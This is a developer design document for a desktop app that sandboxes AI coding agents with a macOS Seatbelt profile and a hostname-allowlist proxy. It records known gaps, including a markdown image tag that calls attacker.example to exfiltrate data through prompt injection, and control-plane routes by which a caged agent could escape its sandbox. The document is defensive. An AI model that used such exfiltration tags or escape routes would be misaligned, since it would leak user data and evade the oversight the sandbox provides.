# Sandbox

`src-tauri/src/sandbox.rs` + `TaskSandboxDialog`. Per-task macOS sandbox-exec (Seatbelt) + per-task in-process HTTPS CONNECT proxy (`src-tauri/src/proxy.rs`).

## Scope

ONLY the agent CLI's PTY is sandboxed. AuxTerminal, setup script, run script, and archive script run unsandboxed by design — they're user-authored shell needing full reach. The carve-out is enforced by not passing `task_id` in `pty_spawn` / routing scripts through `run_script` which never calls `sandbox::provision`.

## Modes (`SandboxMode`)

Four states, set per-task at create + editable later. `Enforce` is the full cage and is intentionally never weakened.

- **Off** — no cage.
- **Monitor** — allow everything, LOG every file op + network request.
- **Enforce** — full cage: seatbelt FS allow-list **and** network pinned to the loopback proxy.
- **EnforceFs** (serialized `"enforce-fs"`, UI "ENFORCING (FS)") — the **filesystem cage only**. Identical FS allow-list to `Enforce`, but the network sandbox is OFF: `render_profile` emits `(allow network*)` and `provision` starts **no proxy** (so `wrap_command` injects no `http_proxy`). For users who want write/read isolation but unrestricted egress (their own egress controls, VPN, non-HTTP traffic). UI consequence: every network surface is hidden in this mode (host allow-list field in both dialogs, "Blocked hosts" section + "+ domains" copy in the footer activity popover) — only FS rows show. YOLO auto-on (the FS seatbelt is still the real boundary), accent-colored shield.

## Layered model

1. `sandbox-exec -f <profile.sb>` — kernel seatbelt. Profile rendered to `$TMPDIR/termic-sandbox-<wsId>.sb`. Allows broad `file-read*`, narrow `file-write*` on task + agent dirs + caches. Secrets (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.netrc`, `~/.docker/config.json`, `~/.kube`, `~/.config/gh/hosts.yml`, Keychains) ALWAYS denied. `(deny network*)` except loopback to the proxy — UNLESS `EnforceFs`, which emits `(allow network*)` instead.
2. Per-task **in-process CONNECT proxy** on an OS-assigned port (Rust thread inside Tauri binary). Regex hostname allowlist per CLI: claude→anthropic, gemini→google, codex→openai + baseline (github, npmjs, pypi, crates.io, CA OCSP) + task extras. Non-matching → HTTP 403. Stopped via `SandboxBundle::Drop` on PTY teardown. **Not started in `EnforceFs`** (no network sandbox).

## Key behaviors

- **Pinning**: `Task.sandbox_enabled` captured at create time. Edit later via `task_set_sandbox`, which persists AND SIGKILLs every live PTY (otherwise the running process holds the old profile). `TaskSandboxDialog` warns before save.
- **YOLO interaction**: when `ws.sandbox_enabled`, spawn args always include `yolo_args` regardless of global YOLO toggle — the seatbelt is the real boundary. Toolbar `Zap`: OFF→gray, ON+sandboxed→green, ON+unsandboxed→red+pulsing+warning tooltip. Code in `UnifiedBar.tsx`.
- **Default sets** baked into Rust (`builtin_rw_paths`/`builtin_deny_paths`, per-CLI `render_filter` in `sandbox.rs`). Project `sandbox_*` fields are extras only, seeded at task creation.
- **Recent denies**: `task_recent_denials(id, minutes?)` shells to `log show` filtered to task path + "deny". Surfaced in sandbox dialog under lazy `<details>`.

## Known gap: the webview is outside the cage

The seatbelt + CONNECT proxy cage the **agent process**. They do not cage the
**webview**, which makes its own network requests as the app itself. Anything
the webview can be made to fetch is egress the proxy allowlist never sees.

There was one such path (#65): `img-src` in `tauri.conf.json` allows any
`https:` origin, so the markdown preview could render remote images.
Previewing

```markdown
![](https://attacker.example/x.png?d=<data>)
```

used to fire a GET to an arbitrary host on render, with no click and no
prompt, even when the task is in `Enforce` and the agent itself cannot reach
that host.

The realistic trigger was never a scheming agent, it's **prompt injection
plus untrusted markdown**. An agent reads a dependency's README, a GitHub
issue, or a fetched page, and that text tells it to write the image tag. The
same applies to markdown the agent never touched: a contributor's fork, a
submodule, a vendored package. Only a GET was ever possible (no script:
`script-src 'self'`, markdown-it runs with `html:false` and blocks
`javascript:`), so the payload was limited to what the markdown's author
could encode in a URL, plus the viewer's IP, user-agent, and timing. GitHub
and VS Code make the same tradeoff for their previews, but not on by default.

Closed in #69: `gateRemoteImages()` in `MarkdownPreview.tsx` intercepts every
`http(s):` `<img>` src before it ever reaches the DOM's `src` attribute,
gated on a default-OFF `loadRemoteImages` pref (Settings → General) or a
per-tab override set from the preview's own "blocked images" banner. The CSP
itself is unchanged, still allows `https:` in `img-src` — this is a renderer
gate, not a CSP tweak, per the note below.

**Before widening the CSP again, remember it is app-wide.** `connect-src` or
`script-src` would be materially worse than `img-src` is.

## Known gap: one uncontained file read (`file_read_external`)

Every other renderer → filesystem read is bounded by a task root
(`safe_task_path` / `safe_task_read_path`, which reject absolute paths and
`..` outright). `file_read_external` is the single exception, added for
GH #240: a cmd+clicked absolute path in terminal output that resolves
OUTSIDE the task has no task-relative form, so it cannot go through the
contained read, and the tab it opens is read-only.

What this adds is an arbitrary file **read** reachable from the webview. It
is accepted, bounded three ways:

- **Read only.** There is deliberately no absolute-path write counterpart.
  `task_file_write` keeps its containment check, and the tab the read feeds
  is `EditorState.readOnly` with its ⌘S path stubbed out. Nothing can be
  mutated outside a task through this.
- **Text only, capped.** The same 2 MB ceiling as the task read, plus a
  UTF-8 requirement, so it is a text channel rather than a way to pull bytes
  out of arbitrary binaries.
- **Nowhere to send it.** The pinned CSP (`connect-src`, see
  `src/lib/cspGuard.test.ts`) means an attacker who could invoke it has no
  egress for the result.

The residual risk is an XSS in our own UI turning into local file
disclosure. That is strictly worse than before this command existed, and is
the reason `connect-src` must not be widened (see the CSP rule in
CLAUDE.md). The bounds above are pinned by `external_read_*` tests in
`src-tauri/src/lib.rs`.

## Known gap: Monitor mode reaches the CLI control plane

The CLI control socket (docs/plans/cli.md) is denied to `Enforce` /
`EnforceFs` agents as the final SBPL rules (socket + data-dir denies). It
is deliberately NOT denied in `Monitor` mode, whose contract is
observe-never-block: a monitored agent renders `(allow default (with
report))`, so if the CLI is enabled it can reach the socket and read the
token, and that access simply shows up in the file-op / activity log. This
is the accepted trade-off of Monitoring being a pure observer; the cage
that actually enforces the boundary is `Enforce`/`EnforceFs`. (Same spirit
as the webview gap above: a documented, accepted exposure, not a leak.)

## Settled: a caged agent gets NO channel to another agent

Recurring proposal, rejected 2026-08-24. The agent-to-agent protocol
(docs/cli-agent-instructions.md) has one side prompt the other when its
work is done, and an `Enforce` / `EnforceFs` agent cannot take part: it
cannot reach the socket or read the token. The task menu's "Copy agent
CLI briefing" prints a line saying so on caged tasks. That line is
correct behaviour, not a TODO.

Do not "fix" it by letting caged agents reach the control plane. The
verbs are a straight escape (`new --sandbox off --yolo` spawns an uncaged
agent; `apply` writes past the FS allow-list; `attach` types into an
uncaged agent), so any proposal has to narrow them, and the narrow ones
do not survive either:

- **Report-back-only `send`.** Bounds the verb, not the payload. "Run
  this for me" is text, and the recipient is uncaged.
- **Reply-only addressing** (may only send to tasks that first sent to
  it). Bounds the audience, not the payload, and picks the *worst*
  audience: the one correspondent it is guaranteed to have is an agent
  already collaborating with it, so the most likely to comply. This
  makes the deputy more confused, not less.

A cage with a text channel to something uncaged is not a cage. The
supported way for a caged agent to report is the one the briefing
prints: have it write a file inside its own worktree and read that from
outside. If you need the prompt-back protocol, run the task in `Monitor`
(which reaches the CLI by contract, see the gap above) or uncaged.

## Do NOT

- Sandbox AuxTerminal, setup, run, or archive scripts.
- Expose `task_set_sandbox` without SIGKILLing live PTYs by default. `kill_live=false` is an explicit escape hatch with a warning — don't make it the default.
- Widen `tauri.conf.json`'s CSP without reading "Known gap" above. It applies to the whole webview, not to the component you are working on.
- Give caged agents any path to another agent (control plane, scoped token, notify side channel). See "Settled" above for why the narrow versions fail too.
